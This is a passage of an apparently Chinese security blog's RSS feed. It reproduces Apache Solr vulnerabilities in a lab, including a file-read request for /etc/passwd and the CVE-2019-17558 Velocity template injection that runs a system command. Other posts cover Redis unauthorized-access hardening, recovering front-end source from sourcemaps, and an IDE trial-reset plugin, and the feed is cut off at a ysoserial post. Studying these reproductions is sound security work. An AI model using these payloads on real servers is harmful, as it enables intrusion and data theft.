&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;GET /solr/demo/debug/dump?param=ContentStreams&amp;amp;stream.url=file:///etc/passwd HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Host: 192.168.8.128:8983&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept: application/json, text/plain, */*&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept-Encoding: gzip, deflate&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Referer: http://192.168.8.128:8983/solr/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;X-Requested-With: XMLHttpRequest&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;DNT: 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Connection: close&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Length: 0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;读取成功&lt;br&gt;
&lt;img src=&#34;../_resources/e6a8a0fa5ab5ce46c52d3877e991197b.png&#34; alt=&#34;e6a8a0fa5ab5ce46c52d3877e991197b.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;cve-2019-17558&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cve-2019-17558&#34;&gt;#&lt;/a&gt; CVE-2019-17558&lt;/h1&gt;
&lt;h2 id=&#34;影响版本-4&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#影响版本-4&#34;&gt;#&lt;/a&gt; 影响版本&lt;/h2&gt;
&lt;p&gt;5.0.0 &amp;lt;=Apache Solr&amp;lt;= 8.3.1&lt;/p&gt;
&lt;h2 id=&#34;漏洞复现&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞复现&#34;&gt;#&lt;/a&gt; 漏洞复现&lt;/h2&gt;
&lt;p&gt;用户可以注入自定义模板，通过 Velocity 模板语言执行任意命令&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;获取 core&lt;br&gt;
 当前存在的 core 为 demo&lt;br&gt;
&lt;img src=&#34;../_resources/e88cbca22f51a1d4843dbf5dd4fa5339.png&#34; alt=&#34;e88cbca22f51a1d4843dbf5dd4fa5339.png&#34;&gt;&lt;/li&gt;
&lt;li&gt;修改 demo 的配置，开启 params.resource.loader.enabled 配置&lt;br&gt;
数据包：&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;POST /solr/demo/config?_=1637649371526&amp;amp;show=schema&amp;amp;wt=json HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Host: 192.168.8.128:8983&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept: application/json, text/plain, */*&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept-Encoding: gzip, deflate&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Referer: http://192.168.8.128:8983/solr/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;X-Requested-With: XMLHttpRequest&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;DNT: 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Connection: close&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Length: 261&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Type:application/json&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;quot;update-queryresponsewriter&amp;quot;: &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;quot;startup&amp;quot;: &amp;quot;lazy&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;quot;name&amp;quot;: &amp;quot;velocity&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;quot;class&amp;quot;: &amp;quot;solr.VelocityResponseWriter&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;quot;template.base.dir&amp;quot;: &amp;quot;&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;quot;solr.resource.loader.enabled&amp;quot;: &amp;quot;true&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;quot;params.resource.loader.enabled&amp;quot;: &amp;quot;true&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;../_resources/8f730000e51cf9135817b1b634c260f7.png&#34; alt=&#34;8f730000e51cf9135817b1b634c260f7.png&#34;&gt;&lt;br&gt;
3. Velocity 模板代码注入&lt;br&gt;
数据包：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;GET /solr/demo/select?q=1&amp;amp;&amp;amp;wt=velocity&amp;amp;v.template=custom&amp;amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27whoami%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Host: 192.168.8.128:8983&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept: application/json, text/plain, */*&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept-Encoding: gzip, deflate&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Referer: http://192.168.8.128:8983/solr/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;X-Requested-With: XMLHttpRequest&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;DNT: 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Connection: close&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;命令执行成功&lt;br&gt;
&lt;img src=&#34;../_resources/f9466bd1a48ca275a93276b87fd78e46.png&#34; alt=&#34;f9466bd1a48ca275a93276b87fd78e46.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;传送门&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#传送门&#34;&gt;#&lt;/a&gt; 传送门：&lt;/h1&gt;
&lt;p&gt;&lt;a href=&#34;https://zhuanlan.zhihu.com/p/374041499&#34;&gt;搜索引擎 Solr 介绍&lt;/a&gt;&lt;br&gt;
&lt;a href=&#34;https://segmentfault.com/a/1190000013822385&#34;&gt; Lucene 就是这么简单&lt;/a&gt;&lt;br&gt;
&lt;a href=&#34;https://blog.csdn.net/whatday/article/details/106974271&#34;&gt; cve-2017-12629 apache solr xxe &amp;amp; rce 漏洞分析&lt;/a&gt;（6）&lt;/p&gt;
&lt;p&gt;Copyright ©milkii0&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2022/01/16/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E9%AA%8C%E8%AF%81%E6%B5%81%E7%A8%8B/</guid>
            <title>redis未授权验证流程</title>
            <link>http://example.com/2022/01/16/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E9%AA%8C%E8%AF%81%E6%B5%81%E7%A8%8B/</link>
            <category>redis,未授权,漏洞利用</category>
            <pubDate>Sun, 16 Jan 2022 11:14:59 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&#34;安装redis&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#安装redis&#34;&gt;#&lt;/a&gt; 安装 redis&lt;/h1&gt;
&lt;h1 id=&#34;登录redis&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#登录redis&#34;&gt;#&lt;/a&gt; 登录 redis&lt;/h1&gt;
&lt;p&gt;redis-cli -h ip&lt;/p&gt;
&lt;h1 id=&#34;redis未授权拿shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#redis未授权拿shell&#34;&gt;#&lt;/a&gt; redis 未授权拿 shell&lt;/h1&gt;
&lt;h2 id=&#34;ssh写公钥&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ssh写公钥&#34;&gt;#&lt;/a&gt; ssh 写公钥&lt;/h2&gt;
&lt;h2 id=&#34;写计划任务&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#写计划任务&#34;&gt;#&lt;/a&gt; 写计划任务&lt;/h2&gt;
&lt;h1 id=&#34;修复建议需要更详细操作&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#修复建议需要更详细操作&#34;&gt;#&lt;/a&gt; 修复建议【需要更详细操作】&lt;/h1&gt;
&lt;p&gt;到 redis 安装目录下，配置 redis.conf 文件：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;限制访问 ip&lt;br&gt;
 增加可访问 ip 白名单&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;只允许本地访问&lt;br&gt;
增加端口访问策略，bind 127.0.0.1&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;添加登陆密码&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;修改 redis.conf 文件，添加&lt;br&gt;
 requirepass  mypasswd&lt;br&gt;
3、在需要对外开放的时候修改默认端口（端口不重复就可以）&lt;br&gt;
port 2344&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;以低权限运行 Redis 服务&lt;br&gt;
配置后需重启&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;为 Redis 服务创建单独的用户和家目录，并且配置禁止登陆&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;h1 id=&#34;传送门&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#传送门&#34;&gt;#&lt;/a&gt; 传送门&lt;/h1&gt;
&lt;p&gt;&lt;a href=&#34;https://www.cnblogs.com/loopkep/p/11135949.html&#34;&gt;https://www.cnblogs.com/loopkep/p/11135949.html&lt;/a&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2021/12/03/sourcemap%E6%B3%84%E9%9C%B2%E8%8E%B7%E5%8F%96%E5%89%8D%E7%AB%AF%E6%BA%90%E7%A0%81/</guid>
            <title>sourcemap泄露获取前端源码</title>
            <link>http://example.com/2021/12/03/sourcemap%E6%B3%84%E9%9C%B2%E8%8E%B7%E5%8F%96%E5%89%8D%E7%AB%AF%E6%BA%90%E7%A0%81/</link>
            <category>前后端分离</category>
            <pubDate>Fri, 03 Dec 2021 11:20:41 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;reverse-sourcemap 下载地址:&lt;a href=&#34;https://github.com/davidkevork/reverse-sourcemap&#34;&gt;https://github.com/davidkevork/reverse-sourcemap&lt;/a&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;安装 nodejs&lt;/p&gt;
&lt;p&gt;&lt;code&gt;apt install npm&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;reverse-sourcemap&lt;/p&gt;
&lt;p&gt;&lt;code&gt;npm install --global reverse-sourcemap&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;使用.js.map 文件获取前端源码&lt;/p&gt;
&lt;p&gt;&lt;code&gt; reverse-sourcemap -v xxx.js.map -o output&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2021/09/08/%E9%97%AE%E9%A2%98%E5%8F%8A%E8%A7%A3%E5%86%B3%E8%AE%B0%E5%BD%95/</guid>
            <title>问题及解决记录</title>
            <link>http://example.com/2021/09/08/%E9%97%AE%E9%A2%98%E5%8F%8A%E8%A7%A3%E5%86%B3%E8%AE%B0%E5%BD%95/</link>
            <pubDate>Wed, 08 Sep 2021 11:31:34 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;java&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#java&#34;&gt;#&lt;/a&gt; Java&lt;/h1&gt;
&lt;h2 id=&#34;debug调试报错&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#debug调试报错&#34;&gt;#&lt;/a&gt; debug，调试报错&lt;/h2&gt;
&lt;p&gt;更换 jdk8 后无法 debug，可以 run&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;D:\语言环境\JDK8_32\bin\java.exe ...&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;FATAL ERROR in native method: JDWP No transports initialized, jvmtiError=AGENT_ERROR_TRANSPORT_LOAD(196)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Picked up JAVA_TOOL_OPTIONS: -Dfile.encoding=UTF-8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ERROR: transport library not found: dt_socket&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ERROR: JDWP Transport dt_socket failed to initialize, TRANSPORT_LOAD(509)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;JDWP exit error AGENT_ERROR_TRANSPORT_LOAD(196): No transports initialized [debugInit.c:750]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Process finished with exit code 1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;更换 idea 下载后的 jdk8 后解决问题，目测因为自己设置的 jdk 路径包含中文（out-of-ascii path）&lt;/p&gt;
&lt;h2 id=&#34;idea重置插件&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#idea重置插件&#34;&gt;#&lt;/a&gt; idea 重置插件&lt;/h2&gt;
&lt;p&gt;idea 无限重置方法&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;settings -&amp;gt; plugins -&amp;gt; 设置图标 -&amp;gt; Manage Repositories，添加：&lt;a href=&#34;https://plugins.zhile.io&#34;&gt;https://plugins.zhile.io&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;在插件市场搜索 IDE eval reset&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;linux&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#linux&#34;&gt;#&lt;/a&gt; Linux&lt;/h1&gt;
&lt;h2 id=&#34;虚拟机物理机互ping&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#虚拟机物理机互ping&#34;&gt;#&lt;/a&gt; 虚拟机物理机互 ping&lt;/h2&gt;
&lt;h3 id=&#34;nat模式物理机ping不通虚拟机&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#nat模式物理机ping不通虚拟机&#34;&gt;#&lt;/a&gt; nat 模式物理机 ping 不通虚拟机&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;虚拟机 ip：192.168.163.128&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;物理机 ip：192.168.46.197&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;不在同一网段，更改虚拟机网卡配置为同一网段&lt;/p&gt;
&lt;p&gt;编辑 -&amp;gt; 虚拟网络编辑器&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后 linux 下重启网卡 &lt;code&gt; systemctl restart networking&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;获得&lt;strong&gt;虚拟机 ip：192.168.46.128&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;物理机还是 ping 不通的话，打开 &lt;code&gt; 控制面板\网络和 Internet\网络连接&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;我 nat 模式对应 VMnet8 网卡，右击禁用后再启动&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;2.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;物理机 ping 通虚拟机&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;3.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;nat模式虚拟机ping不通物理机&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#nat模式虚拟机ping不通物理机&#34;&gt;#&lt;/a&gt; nat 模式虚拟机 ping 不通物理机&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;虚拟机 ip：192.168.163.128&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;物理机 ip：192.168.46.128&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;测试过不是防火墙的问题&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://xn--pingbaidu-927nn75bg59o.com&#34;&gt;可以 ping 通 baidu.com&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;和物理机同一网段&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;物理机可 ping 通虚拟机&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;打开 编辑 -&amp;gt; 虚拟网络编辑器，点击还原默认设置&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;4.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;此时发现虚拟机和物理机不是同一网段，但是可以互 ping&lt;/p&gt;
&lt;p&gt;物理机 ping 虚拟机：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;5.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;虚拟机 ping 物理机：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;6.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2021/09/07/ysoserial%E4%B9%8BCommonsCollections1%E8%B0%83%E8%AF%95/</guid>
            <title>ysoserial之CommonsCollections1调试</title>
            <link>http://example.com/2021/09/07/ysoserial%E4%B9%8BCommonsCollections1%E8%B0%83%E8%AF%95/</link>
            <category>Java反序列化</category>
            <pubDate>Tue, 07 Sep 2021 10:12:48 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;利用链简述&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#利用链简述&#34;&gt;#&lt;/a&gt; 利用链简述&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;任意方法执行&lt;/li&gt;
&lt;li&gt;高版本 java 已修复（Java 8u71 以后）&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;commonscollections1利用代码&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#commonscollections1利用代码&#34;&gt;#&lt;/a&gt; CommonsCollections1 利用代码&lt;/h1&gt;
&lt;p&gt;项目地址：&lt;a href=&#34;https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar&#34;&gt;https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar&lt;/a&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span 